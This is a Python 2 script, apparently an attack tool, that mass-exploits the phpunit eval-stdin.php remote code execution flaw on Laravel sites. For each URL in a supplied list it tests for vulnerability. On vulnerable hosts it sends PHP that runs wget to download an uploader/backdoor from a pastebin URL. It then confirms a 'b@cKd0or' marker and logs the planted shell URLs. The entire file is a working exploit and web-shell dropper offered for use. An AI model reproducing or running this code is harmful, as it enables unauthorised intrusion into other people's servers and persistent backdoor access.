import requests as r
import sys
import os
from platform import system

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')

banner = '''
-----------------------
|   Laravel           |
|     phpunit         |
|Remote Code Execution|
|                     |
|  Coded By bL@cKID   |
-----------------------
'''

print banner

def rce(url):
    try:
        cekos = '<?php echo php_uname(); ?>'
        upshell = '<?php system("wget https://pastebin.com/raw/6QXJsRY3 -O uploader.php"); ?>'
        url = url.strip()
        print "[Exploiting] " + url
        cek = r.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos)
        if 'Linux' in cek.text:
            print "[Vuln] " + url
            r.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell)
            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/uploader.php')
            if 'b@cKd0or' in cekshell.text:
                print "[Shell Uploaded] " + url
                open('shell_phpunit.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/uploader.php'+'\n')
            else:
                print "[Shell not Uploaded]" + url
        else:
            print "[Not Vuln]" + url
    except:
        pass

def main():
    list = open(sys.argv[1], 'r').readlines()
    for x in list:
        try:
            x = x.strip()
            rce(x)
        except:
            pass
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print "Usage : python " + sys.argv[0] + " list.txt"
    else:
        main()
print "Done, saved to : shell_phpunit.txt"
